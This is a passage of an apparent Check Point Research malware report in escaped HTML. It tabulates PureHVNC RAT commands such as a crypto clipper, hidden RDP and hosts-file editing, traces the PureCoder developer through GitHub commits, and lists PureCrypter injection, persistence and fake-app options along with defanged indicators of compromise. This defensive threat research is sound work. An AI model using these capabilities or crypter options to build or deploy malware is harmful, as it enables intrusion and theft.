files.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Coding&lt;/td&gt;&lt;td&gt;ExecuteNETCode&lt;/td&gt;&lt;td&gt;Executes .NET code specified by the threat actor.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;28&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;InstalledApps&lt;/td&gt;&lt;td&gt;InstalledApps&lt;/td&gt;&lt;td&gt;Retrieves installed apps.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;29&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;ActiveWindow&lt;/td&gt;&lt;td&gt;ActiveWindows&lt;/td&gt;&lt;td&gt;Able to control active windows on a remote machine.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;30&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;HRDP&lt;/td&gt;&lt;td&gt;HRDP&lt;/td&gt;&lt;td&gt;Hidden Remote Desktop Protocol capabilities.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;31&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Clipper&lt;/td&gt;&lt;td&gt;Clipper&lt;/td&gt;&lt;td&gt;Monitors the system clipboard and replaces copied data with attacker-controlled content. More specifically detects Cryptocurrencies addresses and replaces them with wallets owned by the attacker. The malware supports Bitcoin (BTC), Litecoin (LTC), Ethereum (ETH), Ravencoin (RVN), Monero (XMR), Bitcoin Cash (BCH)&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;32&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;Torrent&lt;/td&gt;&lt;td&gt;Torrent&lt;/td&gt;&lt;td&gt;Attacker is able to seed or leech files via torrent. This could potentially allow to run a P2P botnet for data distribution. This command may help in exfiltration of huge files.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;33&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;HostsEditor&lt;/td&gt;&lt;td&gt;HostsEditor&lt;/td&gt;&lt;td&gt;Allows an attacker to edit the remote machine&amp;#8217;s hosts file. The hosts file maps domain names to IP addresses, enabling an attacker to override DNS resolution or block/redirect traffic.&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;&lt;strong&gt;34&lt;/strong&gt;&lt;/td&gt;&lt;td&gt;StartupManager&lt;/td&gt;&lt;td&gt;StartupManager&lt;/td&gt;&lt;td&gt;Collects all persistence entries that make programs run at boot. Then able to to remove them.&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt; &lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="purecoder---developer"&gt;PureCoder &amp;#8211; Developer&lt;/h2&gt;
+
+
+
+&lt;p&gt;The Pure family of products includes multiple types of malware that are developed and sold by the same author,&amp;nbsp;&lt;strong&gt;PureCoder&lt;/strong&gt;. The list of products includes:&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;&lt;strong&gt;PureCrypter&lt;/strong&gt;, a Crypter for Native and .NET.&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;PureRAT (PureHVNC RAT),&lt;/strong&gt;&amp;nbsp;a remote administration tool.&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;PureLogs&lt;/strong&gt;, a Stealer &amp;amp; Logger.&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;PureMiner&lt;/strong&gt;, a silent Crypto Miner.&lt;/li&gt;
+
+
+
+&lt;li&gt;&lt;strong&gt;Blue Loader&lt;/strong&gt;, an advanced Botnet.&lt;/li&gt;
+
+
+
+&lt;li&gt;Other smaller malicious products.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31874" height="586" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-07_103017-1024x586.png" style="width: 768px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 17 — Products advertisement.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Multiple threat actors use those products for specific purposes. Often,&amp;nbsp;&lt;strong&gt;PureCrypter&lt;/strong&gt;&amp;nbsp;is used as a crypter, obfuscating other&amp;nbsp;&lt;strong&gt;Pure&lt;/strong&gt;&amp;nbsp;products, such as&amp;nbsp;&lt;strong&gt;PureLogs&lt;/strong&gt;&amp;nbsp;or&amp;nbsp;&lt;strong&gt;PureHVNC&lt;/strong&gt;. The products are sold among the many PureCoder’s Telegram channels.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-full is-resized"&gt;&lt;img alt="" class="wp-image-31875" height="586" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-07_103152.png" style="width: 479px; height: auto;" width="864" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 18 — PureCoder Telegram account.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The developer and seller of the Pure malware family demonstrates the features and capabilities of each product, while the&amp;nbsp;&lt;strong&gt;PureRAT&lt;/strong&gt;&amp;nbsp;administration-builder panel appears to support three main languages: English, Russian, and Chinese.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31876" height="534" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-31_134732-1024x534.png" style="width: 794px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 19 — PureRAT Administration-Builder Panel.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;h3 class="wp-block-heading" id="purecoder---github-accounts"&gt;PureCoder &amp;#8211; GitHub Account(s)&lt;/h3&gt;
+
+
+
+&lt;p&gt;During the previously mentioned campaign, with ID&amp;nbsp;&lt;code&gt;amazon3&lt;/code&gt;, the malware communicated with its command and control server. The bot received three GitHub URLs and downloaded the corresponding files.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31878" height="400" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-06-30_113739-1024x400.png" style="width: 720px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 20 — Contacted repository.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The GitHub account owns a total of five repositories, which contain several executable and plugin files.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31877" height="415" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-06-30_113512-1024x415.png" style="width: 738px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 21 — GitHub account.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;When examining the commits of the repository&amp;nbsp;&lt;code&gt;DFfe9ewf/test3&lt;/code&gt;&amp;nbsp;we discovered something that we did not expect. The commits and file uploads to the specific repository were made by “another account”,&amp;nbsp;&lt;strong&gt;PureCoder&lt;/strong&gt;. Mentioned commits:&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;==================================================
+[2024-10-31T02:01:36Z] Author: PureCoder    
+tree 795fba180464a965f99fc2a50c5a3fad38a6939a
+author PureCoder &amp;lt;87261126+PURE-CODER-1@users.noreply.github.com&gt; 1730340096 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1730340096 +0300
+
+Add files via upload
+ * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81
+==================================================
+[2024-10-31T02:02:22Z] Author: PureCoder    
+tree 8c302d85720b3fa2a8ecceffe1aa7cd23efbe9b5
+parent 647343bed2af6e8c16f296d626d98cdfd0f84cf0
+author PureCoder &amp;lt;87261126+PURE-CODER-1@users.noreply.github.com&gt; 1730340142 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1730340142 +0300
+
+Add files via upload
+ * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81
+ * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9
+==================================================
+[2024-10-31T02:02:40Z] Author: PureCoder    
+tree 4b0fa1d022d409825bb2a872e245ebc9b2bcaff2
+parent f388ef87fcd48a2fe00fa449c1987115e5fe35c8
+author PureCoder &amp;lt;87261126+PURE-CODER-1@users.noreply.github.com&gt; 1730340160 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1730340160 +0300
+
+Add files via upload
+ * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81
+ * chromedriver.exe - 2e5050c50d3a8e9f376f0ae9394cf265ed3dcf06
+ * msedgedriver.exe - 7b133998e526b3bee151329171c82ca1837c86f9&lt;/pre&gt;
+
+
+
+&lt;p&gt;GitHub creates a noreply email shown in the commits with the ID and the Username of the account in the form&amp;nbsp;&lt;code&gt;ID+USERNAME@users.noreply.github.com&lt;/code&gt;. The ID&amp;nbsp;&lt;code&gt;87261126&lt;/code&gt;&amp;nbsp;actually, currently corresponds to&amp;nbsp;&lt;code&gt;DFfe9ewf&lt;/code&gt;&amp;nbsp;which was renamed from&amp;nbsp;&lt;code&gt;PURE-CODER-1&lt;/code&gt;. The commits have been made from the timezone&amp;nbsp;&lt;code&gt;UTC+0300&lt;/code&gt;&amp;nbsp;which corresponds to many countries, including Russia, among others.&lt;/p&gt;
+
+
+
+&lt;p&gt;One of the three downloaded files was once again seen in another GitHub account, which possibly serves for development and testing purposes.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31881" height="401" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-28_132623-1024x401.png" style="width: 774px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 22 — PureCoder Testing/Development account.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The repository containing those files,&amp;nbsp;&lt;code&gt;DemoThing&lt;/code&gt;&amp;nbsp;was created in March 2024, two more repositories with the description “PR” were created by this testing account during April 2025 and contain similar files.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31880" height="292" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-28_133026-1-1024x292.png" style="width: 784px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 23 — PureCoder Testing/Development account repositories.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;Similar to the previous GitHub account, all commits are once again made in the timezone&amp;nbsp;&lt;code&gt;UTC+0300&lt;/code&gt;&amp;nbsp;and contain similar names and files hosted. This account was created&amp;nbsp;&lt;code&gt;testdemo345&lt;/code&gt;&amp;nbsp;was created before&amp;nbsp;&lt;code&gt;DFfe9ewf&lt;/code&gt;&amp;nbsp;and appears to be serving for testing purposes during development phases.&lt;/p&gt;
+
+
+
+&lt;pre class="EnlighterJSRAW"&gt;--------------------------------------------------
+Repository Commits: Demothing
+==================================================
+[2024-03-03T15:38:21Z] Author: testdemo345  
+tree 7f851ca85ec9136486692f283ff16c79a1a211ca
+author testdemo345 &amp;lt;161469984+testdemo345@users.noreply.github.com&gt; 1709480301 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1709480301 +0300
+
+Add files via upload
+ * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81
+ * chromedriver.exe - 03d1d4a02fbd4c72b8ea9826a219a0511a62a974
+ * msedgedriver.exe - 44ceaa27e81a9a9f218fff2c720b72390ff1c6c3
+ 
+--------------------------------------------------
+Repository Commits: uhewrf90
+==================================================
+[2025-04-14T08:00:34Z] Author: testdemo345  
+tree 11e0357a36bd6e908cf9f6e7834cc201a70d692a
+author testdemo345 &amp;lt;161469984+testdemo345@users.noreply.github.com&gt; 1744617634 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1744617634 +0300
+
+Add files via upload
+ * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855
+
+==================================================
+[2025-04-14T08:00:53Z] Author: testdemo345  
+tree 4cf36f75defc34cbd1b50c23e932f8d9a87dca9b
+parent 98ac16ba3e512e495ebf8da7e1ea6bea904ea69b
+author testdemo345 &amp;lt;161469984+testdemo345@users.noreply.github.com&gt; 1744617653 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1744617653 +0300
+
+Add files via upload
+ * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855
+ * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7
+==================================================
+[2025-04-14T08:01:08Z] Author: testdemo345  
+tree 831bcb77a070b342115c68ced7cb22c0c778006f
+parent 564db1627658feb61fe87b07659d371c371a4a41
+author testdemo345 &amp;lt;161469984+testdemo345@users.noreply.github.com&gt; 1744617668 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1744617668 +0300
+
+Add files via upload
+ * WebDriver.dll - 39d3b6bee5450d82d096ad7bdf4244fcb7b1eb81
+ * chromedriver.exe - b8c385aa07aba1344cccfd92fcda2db9dbda9855
+ * msedgedriver.exe - d4fff01e37aff04bf8d4314833c8a5ab9e23aca7
+
+ 
+--------------------------------------------------
+Repository Commits: fdsgb890ugrds
+==================================================
+[2025-04-14T08:04:51Z] Author: testdemo345  
+tree 85e444601df3b756209667504c39116a60e0e3d3
+author testdemo345 &amp;lt;161469984+testdemo345@users.noreply.github.com&gt; 1744617891 +0300
+committer GitHub &amp;lt;noreply@github.com&gt; 1744617891 +0300
+
+Add files via upload
+ * qbittorrent - 7075fb417919b4ae9335ee7abeb9553953c8aac8&lt;/pre&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="pure-builder-github-urls"&gt;Pure Builder &amp;amp; GitHub URLs&lt;/h3&gt;
+
+
+
+&lt;p&gt;At the beginning, we considered the contacted GitHub account (&lt;code&gt;DFfe9ewf&lt;/code&gt;/&lt;code&gt;PURE-CODER-1&lt;/code&gt;) as part of the URL delivered by the threat actor, who can be simply a customer of Pure malware products. Though this hypothesis changed once we discovered a PureRAT Administration-Builder containing hardcoded the GitHub URLs supporting various functionalities of the malware itself.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31882" height="352" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-29_133927-1024x352.png" style="width: 736px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 24 — PureRAT Administration-Builder Assembly.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The GitHub URLs were hardcoded into the PureRAT administration-builder executable, meaning they were not delivered by the threat actor to the victims. Instead, they are part of the administration tool itself, developed by&amp;nbsp;&lt;strong&gt;PureCoder&lt;/strong&gt;.&lt;/p&gt;
+
+
+&lt;div class="wp-block-image is-style-default"&gt;
+&lt;figure class="aligncenter size-large is-resized"&gt;&lt;img alt="" class="wp-image-31883" height="491" src="https://research.checkpoint.com/wp-content/uploads/2025/09/Screenshot_2025-07-29_150220-1024x491.png" style="width: 722px; height: auto;" width="1024" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 25 — Hardcoded GitHub URLs.&lt;/figcaption&gt;&lt;/figure&gt;&lt;/div&gt;
+
+
+&lt;p&gt;These URLs and files appear to support the&amp;nbsp;&lt;code&gt;TwitchBot&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;code&gt;YoutubeBot&lt;/code&gt;&amp;nbsp;plugins. They are used for commands such as following or unfollowing accounts, liking videos, and clicking ads on specified videos on these platforms.&lt;/p&gt;
+
+
+
+&lt;p&gt;While&amp;nbsp;&lt;em&gt;&lt;strong&gt;PureCoder&lt;/strong&gt;&lt;/em&gt;&amp;nbsp;currently uses GitHub and the above-mentioned accounts to host files that support various functionalities of PureRAT,&amp;nbsp;&lt;strong&gt;Check Point Research&lt;/strong&gt;&amp;nbsp;expects these URLs to change more frequently, potentially using different GitHub accounts, alternative hosting platforms, or even being delivered directly as bytes to the bots by the administration tool.&lt;/p&gt;
+
+
+
+&lt;h3 class="wp-block-heading" id="pure-builder---purecrypter-features"&gt;Pure Builder &amp;#8211; PureCrypter Features&lt;/h3&gt;
+
+
+
+&lt;p&gt;While the tool we obtained appears to be PureRAT builder and administration software, some available features are related to the PureCrypter software solution sold and developed by PureCoder as well.&lt;/p&gt;
+
+
+
+&lt;p&gt;The code specifies multiple enumerations (enum) related to PureCrypter. An enum is a list of named constants that represent specific values.&lt;/p&gt;
+
+
+
+&lt;p&gt;PureCrypter enums:&lt;/p&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Enum Name&lt;/th&gt;&lt;th&gt;Member Name&lt;/th&gt;&lt;th&gt;Proto Value&lt;/th&gt;&lt;th&gt;Display Name&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;exe&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;“.exe”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;pif&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;“.pif”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;com&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;“.com”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;bat&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;“.bat”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;cmd&lt;/td&gt;&lt;td&gt;4&lt;/td&gt;&lt;td&gt;“.cmd”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;iso&lt;/td&gt;&lt;td&gt;5&lt;/td&gt;&lt;td&gt;“.iso”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;img&lt;/td&gt;&lt;td&gt;6&lt;/td&gt;&lt;td&gt;“.img”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;html&lt;/td&gt;&lt;td&gt;7&lt;/td&gt;&lt;td&gt;“.html”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;setup&lt;/td&gt;&lt;td&gt;9&lt;/td&gt;&lt;td&gt;“.setup”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;scr&lt;/td&gt;&lt;td&gt;10&lt;/td&gt;&lt;td&gt;“.scr”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterExtension&lt;/td&gt;&lt;td&gt;vbs&lt;/td&gt;&lt;td&gt;11&lt;/td&gt;&lt;td&gt;“.vbs”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFakeApp&lt;/td&gt;&lt;td&gt;BitcoinTransactionAccelerator&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;“[Fake] Bitcoin Transaction Accelerator”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFakeApp&lt;/td&gt;&lt;td&gt;BitcoinMining&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;“[Fake] Bitcoin CPU Mining”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFakeApp&lt;/td&gt;&lt;td&gt;FakeRAT&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;“[Fake] FakeRAT”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFakeMessageType&lt;/td&gt;&lt;td&gt;Error&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;“Error”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFakeMessageType&lt;/td&gt;&lt;td&gt;Information&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;“Information”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFolder&lt;/td&gt;&lt;td&gt;AppData&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;“%appdata%”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFolder&lt;/td&gt;&lt;td&gt;Local&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;“%localappdata%”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFolder&lt;/td&gt;&lt;td&gt;Documents&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;“%userprofile%”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFolder&lt;/td&gt;&lt;td&gt;Temp&lt;/td&gt;&lt;td&gt;3&lt;/td&gt;&lt;td&gt;“%temp%”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFramework&lt;/td&gt;&lt;td&gt;Framework_45&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;“v4.5”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFramework&lt;/td&gt;&lt;td&gt;Framework_46&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;“v4.6”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterFramework&lt;/td&gt;&lt;td&gt;Framework_48&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;“v4.8”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterInjection&lt;/td&gt;&lt;td&gt;Reflection&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;“Reflection”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterInjection&lt;/td&gt;&lt;td&gt;RunPE&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;“RunPE”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterInjection&lt;/td&gt;&lt;td&gt;Shellcode&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;“Shellcode”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterStartup&lt;/td&gt;&lt;td&gt;Registry&lt;/td&gt;&lt;td&gt;0&lt;/td&gt;&lt;td&gt;“Registry”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterStartup&lt;/td&gt;&lt;td&gt;StartupFolder&lt;/td&gt;&lt;td&gt;1&lt;/td&gt;&lt;td&gt;“StartupFolder”&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureCrypterStartup&lt;/td&gt;&lt;td&gt;TaskScheduler&lt;/td&gt;&lt;td&gt;2&lt;/td&gt;&lt;td&gt;“TaskScheduler”&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;/figure&gt;
+
+
+
+&lt;p&gt;These enums give us some important information regarding the choices a threat actor can make during encrypting their malware using PureCrypter. For example, we can observe the installation options (&lt;code&gt;PureCrypterFolder&lt;/code&gt;), the persistence mechanism (&lt;code&gt;PureCrypterStartup&lt;/code&gt;) as well as the execution method (&lt;code&gt;PureCrypterInjection&lt;/code&gt;).&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="conclusion"&gt;Conclusion&lt;/h2&gt;
+
+
+
+&lt;p&gt;The forensic investigation of the ClickFix campaign provides a comprehensive view of the&amp;nbsp;&lt;strong&gt;Pure malware ecosystem&lt;/strong&gt;&amp;nbsp;and its operational mechanics. The eight-day intrusion highlighted the coordinated use of multiple tools, including&amp;nbsp;&lt;strong&gt;Rust Loader&lt;/strong&gt;,&amp;nbsp;&lt;strong&gt;PureHVNC RAT&lt;/strong&gt;, and the&amp;nbsp;&lt;strong&gt;Sliver C2 framework&lt;/strong&gt;, demonstrating the threat actor’s sophistication. Check Point Research’s in-depth analysis of&amp;nbsp;&lt;strong&gt;PureHVNC RAT,&lt;/strong&gt;&amp;nbsp;including all its commands, plugins, and associated supporting files, sheds light on previously opaque aspects of this malware family.&lt;/p&gt;
+
+
+
+&lt;p&gt;Significantly, the investigation linked several GitHub repositories directly to the developer,&amp;nbsp;&lt;em&gt;&lt;strong&gt;PureCoder&lt;/strong&gt;&lt;/em&gt;, offering rare insights into their operational practices, including a&amp;nbsp;&lt;strong&gt;UTC+0300 timezone&lt;/strong&gt;&amp;nbsp;and potential geographic locations. The discovery of the&amp;nbsp;&lt;strong&gt;PureRAT builder&lt;/strong&gt;&amp;nbsp;and additional information on&amp;nbsp;&lt;strong&gt;PureCrypter&lt;/strong&gt;&amp;nbsp;further illustrate the modular and evolving nature of this malware suite, emphasizing the ongoing threat posed by Pure malware to organizations globally.&lt;/p&gt;
+
+
+
+&lt;p&gt;Overall, this research not only enhances understanding of the Pure malware family but also provides actionable intelligence that can assist cybersecurity professionals and law enforcement agencies in tracking and mitigating future campaigns conducted by both&amp;nbsp;&lt;strong&gt;PureCoder&lt;/strong&gt;&amp;nbsp;and the cybercriminals leveraging their tools.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="protections"&gt;Protections&lt;/h2&gt;
+
+
+
+&lt;p&gt;Check Point Threat Emulation and Harmony Endpoint provide comprehensive coverage of attack tactics, file types, and operating systems and protect against the attacks and threats described in this report.&lt;/p&gt;
+
+
+
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+
+
+&lt;h2 class="wp-block-heading" id="indicators-of-compromise"&gt;Indicators of Compromise&lt;/h2&gt;
+
+
+
+&lt;figure class="wp-block-table"&gt;&lt;table class="has-fixed-layout"&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Description&lt;/th&gt;&lt;th&gt;Value&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td&gt;JavaScript File&lt;/td&gt;&lt;td&gt;85513077AADBE50FE68055F0420DA2E6B97BD30D&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;JavaScript C&amp;amp;Cs&lt;/td&gt;&lt;td&gt;stathub[.]quest&lt;br /&gt;stategiq[.]quest&lt;br /&gt; mktblend[.]monster&lt;br /&gt; dsgnfwd[.]xyz&lt;br /&gt; dndhub[.]xyz&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;First PureHVNC RAT&lt;/td&gt;&lt;td&gt;E3A79CE291546191A5DDB039B2F9BF523BB9C4FB&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Inno Setup Second PureHVNC RAT&lt;/td&gt;&lt;td&gt;D340B780194D44EE9B8D32F596B5A13723ABBE1D&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Rust Loader&lt;/td&gt;&lt;td&gt;99CBBE5F68D50B79AF8FB748F51794DE137F4FE4&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureHVNC&lt;/td&gt;&lt;td&gt;34EC79AB8A00DC6908874CDF7762756A2DCA4274&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;PureHVNC C&amp;amp;C&lt;/td&gt;&lt;td&gt;54.197.141[.]245&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;GitHub account&lt;/td&gt;&lt;td&gt;hxxps://github[.]com/DFfe9ewf&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;GitHub &amp;#8211; 